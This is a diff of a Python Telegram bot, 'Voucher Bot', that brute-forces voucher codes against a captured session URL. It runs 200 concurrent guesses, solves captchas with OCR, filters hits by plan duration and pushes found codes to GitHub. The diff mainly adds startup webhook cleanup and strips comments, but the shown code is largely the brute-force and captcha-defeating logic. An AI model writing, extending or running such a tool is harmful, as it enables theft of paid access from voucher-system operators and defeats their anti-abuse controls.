@@ -2,7 +2,8 @@
 Voucher Bot — Optimized (single-file)
 
 Feature set:
-  • Admin-only command guard (except /start, /help)
+  • Auto-cleanup stale webhook at startup (prevents 409 Conflict)
+  • Admin-only command guard (except none)
   • SSRF guard + session-URL structure check
   • Plan filters (e.g. 30min, 2h, 1d, 1mo, unlimit)
   • Multi-length spec (6 | 6,7,8 | 6-8 | 6,8-10,12) + target count
@@ -24,8 +25,8 @@ import re
 import string
 import time
 import uuid
-from urllib.parse import urlparse, parse_qs
 import ipaddress
+from urllib.parse import urlparse, parse_qs
 
 import aiohttp
 import cv2
@@ -61,7 +62,7 @@ CONCURRENCY  = 200
 BATCH_SIZE   = 500
 STATE_FILE   = "state.json"
 RESULT_FILE  = "result.json"
-EXHAUSTIVE_MODE1_MAX_LEN = 5   # 10^5 max in-memory enumeration
+EXHAUSTIVE_MODE1_MAX_LEN = 5
 TG_MAX       = 4096
 START_TS     = time.monotonic()
 
@@ -82,22 +83,20 @@ PLAN_RE = re.compile(r"^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$", re.IGNORECASE)
 # ── Global state ───────────────────────────────────────────────────────────
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data       = {}     # chat_id -> {"session_url": str}
-scan_tasks      = {}     # chat_id -> {"task", "stop", "scan_id"}
-success_texts   = {}     # chat_id -> [{"code","session_id","plan"}]
-limited_texts   = {}     # chat_id -> [code, ...]
-notify_setting  = {}     # chat_id -> bool
-last_scan_params= {}     # chat_id -> {"mode","lengths","target","plan_filters"}
-pending_brute   = {}     # chat_id -> {"mode","lengths","target","plan_filters"}
+user_data        = {}
+scan_tasks       = {}
+success_texts    = {}
+limited_texts    = {}
+notify_setting   = {}
+last_scan_params = {}
+pending_brute    = {}
 
-# Notification message-ID trackers (per chat)
-success_msg_ids = {}     # chat_id -> [msg_id, ...]
-limited_msg_ids = {}     # chat_id -> [msg_id, ...]
+success_msg_ids  = {}
+limited_msg_ids  = {}
 
-# Async primitives
-_notify_locks  = {}      # chat_id -> asyncio.Lock (created lazily)
-_success_queue = asyncio.Queue()      # for GitHub batch writer
-_voucher_sem   = None                 # created in main()
+_notify_locks  = {}
+_success_queue = asyncio.Queue()
+_voucher_sem   = None
 session: aiohttp.ClientSession | None = None
 _connector: aiohttp.TCPConnector | None = None
 
@@ -116,7 +115,6 @@ def is_admin(chat_id) -> bool:
 
 
 def _split_4096(text: str) -> list[str]:
-    """Split text into <=4096-char chunks preferring newline boundaries."""
     if len(text) <= TG_MAX:
         return [text]
     chunks, cur = [], ""
@@ -134,7 +132,6 @@ def _split_4096(text: str) -> list[str]:
 
 
 async def _render_chunked(chat_id: int, text: str, tracker: dict):
-    """Render `text` into N messages, reusing stored message IDs in `tracker`."""
     chunks = _split_4096(text)
     mids = tracker.get(chat_id, [])
     for i, chunk in enumerate(chunks):
@@ -158,7 +155,6 @@ async def _render_chunked(chat_id: int, text: str, tracker: dict):
                 mids.append(sent.message_id)
             except Exception as ee:
                 logger.debug("send chunk error: %s", ee)
-    # Delete extras (rare)
     while len(mids) > len(chunks):
         mid = mids.pop()
         try:
@@ -198,7 +194,7 @@ def plan_to_minutes(s) -> float:
             total += v * 24 * 60
         elif unit == "h":
             total += v * 60
-        else:            # min / m
+        else:
             total += v
     return total
 
@@ -241,7 +237,6 @@ def iter_codes(mode, length):
 
     _, charset, _ = MODE_INFO[mode]
 
-    # Exhaustive shuffled enumeration for mode 1, small lengths
     if mode == "1" and length <= EXHAUSTIVE_MODE1_MAX_LEN:
         order = list(range(10 ** length))
         random.shuffle(order)
@@ -276,7 +271,6 @@ def parse_length_spec(spec: str) -> list[int]:
     return out
 
 
-# ── Progress formatting ────────────────────────────────────────────────────
 def format_progress(checked, speed, found, target, current_length, lengths):
     lines = ["📋 Status: Running"]
     if current_length is not None and lengths and len(lengths) > 1:
@@ -336,14 +330,12 @@ def _get_ocr():
 
 def _ocr_sync(image_bytes: bytes):
     ocr = _get_ocr()
-    # 1) Raw first — ddddocr prefers raw captchas.
     try:
         raw = ocr.classification(image_bytes)
         if raw and raw.isalnum() and len(raw) >= 3:
             return raw.upper()
     except Exception:
         pass
-    # 2) Fallback — thresholded.
     try:
         arr = np.frombuffer(image_bytes, np.uint8)
         img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
@@ -474,7 +466,7 @@ async def get_balance(session_or_token: str) -> str:
         return "N/A"
 
 
-# ── Notification rendering (race-safe) ─────────────────────────────────────
+# ── Notification rendering ─────────────────────────────────────────────────
 async def _notify_success(chat_id: int):
     if not notify_setting.get(chat_id, False):
         return
@@ -570,12 +562,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
     if not response:
         return None
 
-    # ── Success ───────────────────────────────────────────────────────────
     if "logonUrl" in response:
         if recheck:
             return code
 
-        # Extract token from logonUrl for balance lookup, fall back to session_id
         token_for_balance = session_id
         try:
             rj = json.loads(response)
@@ -590,7 +580,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         if plan_str in ("N/A", "Error"):
             plan_str = "N/A"
 
-        # Plan filter
         if plan_filters:
             code_mins = plan_to_minutes(plan_str)
             if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
@@ -606,7 +595,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         await _notify_success(chat_id)
         return code
 
-    # ── Limited ───────────────────────────────────────────────────────────
     if "STA" in response:
         limited_texts.setdefault(chat_id, []).append(code)
         await _notify_limited(chat_id)
@@ -696,7 +684,6 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                         except Exception:
                             pass
 
-        # All lengths exhausted
         try:
             await bot.edit_message_text(
                 chat_id=chat_id, message_id=progress_msg.message_id,
@@ -708,7 +695,6 @@ async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
         save_state()
 
     except asyncio.CancelledError:
-        # Leave last_scan_params intact so /resume works.
         raise
     finally:
         scan_tasks.pop(chat_id, None)
@@ -754,7 +740,6 @@ async def _gh_put_retry(path, content, sha, message, retries=2):
 
 
 async def github_writer_loop():
-    """Batched GitHub updates every 80 seconds, capped at 500 items per cycle."""
     if not GITHUB_ON:
         logger.info("GitHub persistence disabled (missing env vars)")
         return
@@ -929,7 +914,6 @@ async def cmd_setup(message):
         return
 
     cid = message.chat.id
-    # Cancel any running scan for this chat
     old = scan_tasks.pop(cid, None)
     if old and old.get("task") and not old["task"].done():
         old["stop"] = True
@@ -940,7 +924,6 @@ async def cmd_setup(message):
               success_msg_ids, limited_msg_ids):
         d.pop(cid, None)
 
-    # Clear this chat's saved codes on GitHub
     if GITHUB_ON:
         try:
             results, sha = await _gh_get(RESULT_FILE)
@@ -997,13 +980,11 @@ async def cmd_brute(message):
         await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
         return
 
-    # If a scan is already running
     running = scan_tasks.get(cid)
     if running and not running["task"].done():
         await bot.reply_to(message, "⚠️ Scan တစ်ခု run နေဆဲ။ /stop ဦးသုံးပါ။")
         return
 
-    # If a previous scan can be resumed
     if cid in last_scan_params:
         markup = InlineKeyboardMarkup()
         markup.add(
@@ -1046,7 +1027,6 @@ async def _start_brute_scan(chat_id, mode, lengths, target, plan_filters):
         )
     )
     scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
-    # Reset notification trackers so a new scan starts fresh notifications
     success_msg_ids.pop(chat_id, None)
     limited_msg_ids.pop(chat_id, None)
 
@@ -1278,6 +1258,14 @@ async def main():
 
     logger.info("🚀 Voucher Bot starting…")
     try:
+        # ── CRITICAL: drop any stale webhook before polling ────────────
+        # Prevents: 409 Conflict "can't use getUpdates while webhook is active"
+        try:
+            await bot.delete_webhook(drop_pending_updates=True)
+            logger.info("🧹 Webhook cleared (pending updates dropped)")
+        except Exception as e:
+            logger.warning("delete_webhook failed: %s", e)
+
         asyncio.create_task(web_server())
         asyncio.create_task(github_writer_loop())
         load_state()
